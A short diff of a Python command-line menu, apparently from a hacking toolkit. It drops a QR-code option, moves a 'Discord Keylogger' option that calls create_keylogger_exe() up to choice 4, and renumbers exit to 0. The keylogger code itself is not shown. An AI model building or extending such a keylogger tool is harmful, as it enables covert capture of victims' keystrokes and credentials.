@@ -38,14 +38,9 @@ def main():
             time.sleep(2)
             main()
         elif choice == "4":
-            #qr_code_generator()
-            print(f"{Fore.GREEN}QR Code generated successfully.{Style.RESET_ALL}")
-            time.sleep(2)
-            main()
-        elif choice == "5":
             print(f"{Fore.GREEN}Discord Keylogger started successfully.{Style.RESET_ALL}")
             create_keylogger_exe()
-        elif choice == "6":
+        elif choice == "0":
             print(f"{Fore.GREEN}Exiting... Bye!{Style.RESET_ALL}")
             exit(0)
         else:
